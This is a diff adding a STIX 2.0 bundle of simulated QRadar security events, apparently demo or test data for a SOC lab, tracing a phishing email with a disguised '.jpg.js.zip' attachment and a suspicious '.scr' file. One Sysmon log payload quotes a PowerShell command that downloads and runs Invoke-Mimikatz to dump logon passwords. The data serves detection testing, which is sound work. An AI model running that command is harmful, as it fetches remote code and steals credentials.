@@ -1,0 +1,475 @@
+{
+	"type": "bundle",
+	"id": "bundle--38cfdef3-d7ad-4043-9401-adf812ad614d",
+	"spec_version": "2.0",
+	"objects": [{
+			"type": "identity",
+			"id": "identity--f431f809-377b-45e0-aa1c-6a4751cae5ff",
+			"name": "qradar",
+			"created": "2021-03-02T19:33:00.000Z",
+			"modified": "2021-03-02T18:33:00.000Z",
+			"identity_class": "events"
+		},
+		{
+			"id": "observed-data--05ba0f2c-e097-4dc4-aba5-c92aa2b8d0b7",
+			"type": "observed-data",
+			"created_by_ref": "identity--f431f809-377b-45e0-aa1c-6a4751cae5ff",
+			"created": "2021-03-02T18:31:00.000Z",
+			"modified": "2021-03-02T18:31:00.000Z",
+			"objects": {
+				"0": {
+					"type": "ipv4-addr",
+					"value": "192.168.100.21",
+					"resolves_to_refs": [
+						"2"
+					]
+				},
+				"1": {
+					"type": "network-traffic",
+					"src_ref": "0",
+					"src_port": 0,
+					"dst_ref": "3",
+					"dst_port": 0,
+					"protocols": [
+						"reserved"
+					]
+				},
+				"2": {
+					"type": "mac-addr",
+					"value": "00:00:00:00:00:00"
+				},
+				"3": {
+					"type": "ipv4-addr",
+					"value": "192.168.100.21",
+					"resolves_to_refs": [
+						"4"
+					]
+				},
+				"4": {
+					"type": "mac-addr",
+					"value": "00:00:00:00:00:00"
+				},
+				"5": {
+					"type": "artifact",
+					"payload_bin": "=="
+				},
+				"6": {
+					"type": "file",
+					"name": "IMG159131.jpg.js.zip",
+					"hashes": {
+						"SHA-256": "94faa76502bb4342ed7cc3207b3158027807a01575436e2b683d4816842ed65d"
+					}
+				},
+				"7": {
+					"type": "directory",
+					"path": "c:\\users\\adam\\downloads"
+				},
+				"8": {
+					"account_login": "adam",
+					"type": "user-account",
+					"username": "adam"
+				}
+			},
+			"x_ibm_ariel": {
+				"event_name": "New File On Network",
+				"qid": 59500044,
+				"category_name": "event",
+				"category_id": 8060,
+				"high_level_category_name": "System",
+				"high_level_category_id": 8000,
+				"log_source_id": 73,
+				"device_type": 230,
+				"log_source_type_name": "Bit9 Security Platform",
+				"log_source_name": "Bit9 Security Platform",
+				"direction": "L2L",
+				"identity_ip": "0.0.0.0",
+				"magnitude": 5,
+				"severity": 4,
+				"credibility": 5,
+				"relevance": 6,
+				"geographic": "other",
+				"domain_id": 0,
+				"domain_name": "Default Domain"
+			},
+			"first_observed": "2021-03-02T18:31:00.000Z",
+			"last_observed": "2021-03-02T18:31:00.000Z",
+			"number_observed": 1
+		},
+		{
+			"id": "observed-data--05ba0f2c-e097-4dc4-aba5-c91aa3b7d1b8",
+			"type": "observed-data",
+			"created_by_ref": "identity--f431f809-377b-45e0-aa1c-6a4751cae5ff",
+			"created": "2021-03-02T18:32:00.000Z",
+			"modified": "2021-03-02T18:32:00.000Z",
+			"objects": {
+				"0": {
+					"type": "ipv4-addr",
+					"value": "192.168.100.22",
+					"resolves_to_refs": [
+						"2"
+					]
+				},
+				"1": {
+					"type": "network-traffic",
+					"src_ref": "0",
+					"src_port": 0,
+					"dst_ref": "3",
+					"dst_port": 0,
+					"protocols": [
+						"reserved"
+					]
+				},
+				"2": {
+					"type": "mac-addr",
+					"value": "00:00:00:00:00:00"
+				},
+				"3": {
+					"type": "ipv4-addr",
+					"value": "192.168.100.22",
+					"resolves_to_refs": [
+						"4"
+					]
+				},
+				"4": {
+					"type": "mac-addr",
+					"value": "00:00:00:00:00:00"
+				},
+				"5": {
+					"type": "artifact",
+					"payload_bin": "=="
+				},
+				"6": {
+					"type": "file",
+					"name": "IMG159131.jpg.js.zip",
+					"hashes": {
+						"SHA-256": "94faa76502bb4342ed7cc3207b3158027807a01575436e2b683d4816842ed65d"
+					}
+				},
+				"7": {
+					"type": "directory",
+					"path": "c:\\users\\bob\\downloads"
+				},
+				"8": {
+					"account_login": "bob",
+					"type": "user-account",
+					"username": "bob"
+				}
+			},
+			"x_ibm_ariel": {
+				"event_name": "New File On Network",
+				"qid": 59500044,
+				"category_name": "event",
+				"category_id": 8060,
+				"high_level_category_name": "System",
+				"high_level_category_id": 8000,
+				"log_source_id": 73,
+				"device_type": 230,
+				"log_source_type_name": "Bit9 Security Platform",
+				"log_source_name": "Bit9 Security Platform",
+				"direction": "L2L",
+				"identity_ip": "0.0.0.0",
+				"magnitude": 5,
+				"severity": 4,
+				"credibility": 5,
+				"relevance": 6,
+				"geographic": "other",
+				"domain_id": 0,
+				"domain_name": "Default Domain"
+			},
+			"first_observed": "2021-03-02T18:32:00.000Z",
+			"last_observed": "2021-03-02T18:32:00.000Z",
+			"number_observed": 1
+		},
+		{
+			"id": "observed-data--05ba0f2c-e097-4dc4-aba5-c91aa3b8d1b9",
+			"type": "observed-data",
+			"created_by_ref": "identity--f431f809-377b-45e0-aa1c-6a4751cae5ff",
+			"created": "2021-03-02T19:30:00.000Z",
+			"modified": "2021-03-02T19:30:00.000Z",
+			"objects": {
+				"0": {
+					"type": "ipv4-addr",
+					"value": "192.168.100.22",
+					"resolves_to_refs": [
+						"2"
+					]
+				},
+				"1": {
+					"type": "network-traffic",
+					"src_ref": "0",
+					"src_port": 0,
+					"dst_ref": "3",
+					"dst_port": 0,
+					"protocols": [
+						"reserved"
+					]
+				},
+				"2": {
+					"type": "mac-addr",
+					"value": "00:00:00:00:00:00"
+				},
+				"3": {
+					"type": "ipv4-addr",
+					"value": "192.168.100.22",
+					"resolves_to_refs": [
+						"4"
+					]
+				},
+				"4": {
+					"type": "mac-addr",
+					"value": "00:00:00:00:00:00"
+				},
+				"5": {
+					"type": "artifact",
+					"payload_bin": "=="
+				},
+				"6": {
+					"type": "file",
+					"name": "img05960602020-jpg.scr",
+					"hashes": {
+						"SHA-256": "05af0cf40590aef24b28fa04c6b4998b7ab3b7f26e60c507adb84f3d837778f2"
+					}
+				},
+				"7": {
+					"type": "directory",
+					"path": "c:\\users\\bob\\desktop"
+				},
+				"8": {
+					"account_login": "bob",
+					"type": "user-account",
+					"username": "bob"
+				}
+			},
+			"x_ibm_ariel": {
+				"event_name": "New File On Network",
+				"qid": 59500044,
+				"category_name": "event",
+				"category_id": 8060,
+				"high_level_category_name": "System",
+				"high_level_category_id": 8000,
+				"log_source_id": 73,
+				"device_type": 230,
+				"log_source_type_name": "Bit9 Security Platform",
+				"log_source_name": "Bit9 Security Platform",
+				"direction": "L2L",
+				"identity_ip": "0.0.0.0",
+				"magnitude": 5,
+				"severity": 4,
+				"credibility": 5,
+				"relevance": 6,
+				"geographic": "other",
+				"domain_id": 0,
+				"domain_name": "Default Domain"
+			},
+			"first_observed": "2021-03-02T19:30:00.000Z",
+			"last_observed": "2021-03-02T19:30:00.000Z",
+			"number_observed": 1
+		},
+		{
+			"id": "observed-data--8debb7f7-5031-4581-8951-ebd73a9603ac",
+			"type": "observed-data",
+			"created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
+			"created": "2021-03-02T19:30:00.000Z",
+			"modified": "2021-03-02T19:30:00.000Z",
+			"objects": {
+				"0": {
+					"type": "ipv4-addr",
+					"value": "192.168.100.22",
+					"resolves_to_refs": ["2"]
+				},
+				"1": {
+					"type": "network-traffic",
+					"src_ref": "0",
+					"src_port": 0,
+					"dst_ref": "3",
+					"dst_port": 0,
+					"protocols": [
+						"reserved"
+					]
+				},
+				"2": {
+					"type": "mac-addr",
+					"value": "00:00:00:00:00:00"
+				},
+				"3": {
+					"type": "ipv4-addr",
+					"value": "192.168.100.22",
+					"resolves_to_refs": ["4"]
+				},
+				"4": {
+					"type": "mac-addr",
+					"value": "00:00:00:00:00:00"
+				},
+				"5": {
+					"type": "artifact",
+					"payload_bin": ""
+				},
+				"6": {
+					"type": "file",
+					"hashes": {
+						"SHA-1": "F393D7B531CD44CE418647FE95715ADC3E3C61D2",
+						"SHA-256": "70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE",
+						"imp": "A4D32F1AEF525B8ADA6A26F28596AC2E"
+					},
+					"name": "powershell.exe",
+					"parent_directory_ref": "8"
+				},
+				"7": {
+					"type": "process",
+					"name": "powershell.exe",
+					"binary_ref": "6",
+					"command_line": "powershell node c:\\users\\bob\\desktop\\img05960602020-jpg.scr exit'\""
+				},
+				"8": {
+					"type": "directory",
+					"path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+				}
+			},
+			"x_com_ibm_ariel": {
+				"devicetype": 18,
+				"qid_name": "Detected PowerShell Command to run File from localhost",
+				"qid": 67500346,
+				"category_name": "Suspicious Windows Events",
+				"category_id": 7036,
+				"log_source_id": 63,
+				"log_source_name": "sysmon - ops::qradar ",
+				"identity_ip": "0.0.0.0",
+				"utf8_payload": "WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94188\tTimeGenerated=1570110670\tTimeWritten=1570110670\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2019-10-03 13:51:10.570 ProcessGuid: {1C2D3F54-FCCE-5D95-0000-001078EB0B00} ProcessId: 2252 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155) Description: Windows PowerShell Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\" CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=F393D7B531CD44CE418647FE95715ADC3E3C61D2,MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE,IMPHASH=A4D32F1AEF525B8ADA6A26F28596AC2E ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage:powershell.exe\" ",
+				"magnitude": 5
+			},
+			"first_observed": "2021-03-02T19:30:00.000Z",
+			"last_observed": "2021-03-02T19:30:00.000Z",
+			"number_observed": 1
+		},
+		{
+			"id": "observed-data--8debb7f7-5031-4581-8951-ebd84a1714ac",
+			"type": "observed-data",
+			"created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
+			"created": "2021-03-02T18:30:00.000Z",
+			"modified": "2021-03-02T18:30:00.000Z",
+			"objects": {
+				"0": {
+					"type": "ipv4-addr",
+					"value": "192.168.0.15",
+					"resolves_to_refs": ["2"]
+				},
+				"1": {
+					"type": "network-traffic",
+					"src_ref": "0",
+					"src_port": 0,
+					"dst_ref": "3",
+					"dst_port": 0,
+					"protocols": [
+						"reserved"
+					]
+				},
+				"2": {
+					"type": "mac-addr",
+					"value": "00:00:00:00:00:00"
+				},
+				"3": {
+					"type": "ipv4-addr",
+					"value": "192.168.0.15",
+					"resolves_to_refs": ["4"]
+				},
+				"4": {
+					"type": "mac-addr",
+					"value": "00:00:00:00:00:00"
+				},
+				"5": {
+					"type": "EmailMessage",
+					"subject": "how are you doing today?",
+					"to": "adam@soclabdemo.onmicrosoft.com",
+					"from": "attacker.malicious@gmail.com"
+				},
+				"6": {
+					"type": "file",
+					"hashes": {
+						"SHA-256": "94faa76502bb4342ed7cc3207b3158027807a01575436e2b683d4816842ed65d"
+					},
+					"name": "IMG159131.jpg.js.zip"
+				}
+			},
+			"x_com_ibm_ariel": {
+				"devicetype": 18,
+				"qid_name": "Mail server info message",
+				"qid": 67500346,
+				"category_name": "New mail recieved",
+				"category_id": 8052,
+				"log_source_id": 61,
+				"log_source_name": "Cisco IronPort @ 192.168.0.15",
+				"identity_ip": "0.0.0.0",
+				"utf8_payload": "",
+				"magnitude": 5
+			},
+			"first_observed": "2021-03-02T18:30:00.000Z",
+			"last_observed": "2021-03-02T18:30:00.000Z",
+			"number_observed": 1
+		},
+		{
+			"id": "observed-data--8debb7f7-5031-4581-8951-ebd84a1715ac",
+			"type": "observed-data",
+			"created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
+			"created": "2021-03-02T18:30:00.000Z",
+			"modified": "2021-03-02T18:30:00.000Z",
+			"objects": {
+				"0": {
+					"type": "ipv4-addr",
+					"value": "192.168.0.15",
+					"resolves_to_refs": ["2"]
+				},
+				"1": {
+					"type": "network-traffic",
+					"src_ref": "0",
+					"src_port": 0,
+					"dst_ref": "3",
+					"dst_port": 0,
+					"protocols": [
+						"reserved"
+					]
+				},
+				"2": {
+					"type": "mac-addr",
+					"value": "00:00:00:00:00:00"
+				},
+				"3": {
+					"type": "ipv4-addr",
+					"value": "192.168.0.15",
+					"resolves_to_refs": ["4"]
+				},
+				"4": {
+					"type": "mac-addr",
+					"value": "00:00:00:00:00:00"
+				},
+				"5": {
+					"type": "EmailMessage",
+					"subject": "did you like my photo?",
+					"to": "bob@soclabdemo.onmicrosoft.com",
+					"from": "attacker.malicious@gmail.com"
+				},
+				"6": {
+					"type": "file",
+					"hashes": {
+						"SHA-256": "94faa76502bb4342ed7cc3207b3158027807a01575436e2b683d4816842ed65d"
+					},
+					"name": "IMG159131.jpg.js.zip"
+				}
+			},
+			"x_com_ibm_ariel": {
+				"devicetype": 18,
+				"qid_name": "Mail server info message",
+				"qid": 67500346,
+				"category_name": "New mail recieved",
+				"category_id": 8052,
+				"log_source_id": 61,
+				"log_source_name": "Cisco IronPort @ 192.168.0.15",
+				"identity_ip": "0.0.0.0",
+				"utf8_payload": "",
+				"magnitude": 5
+			},
+			"first_observed": "2021-03-02T18:30:00.000Z",
+			"last_observed": "2021-03-02T18:30:00.000Z",
+			"number_observed": 1
+		}
+	]
+}
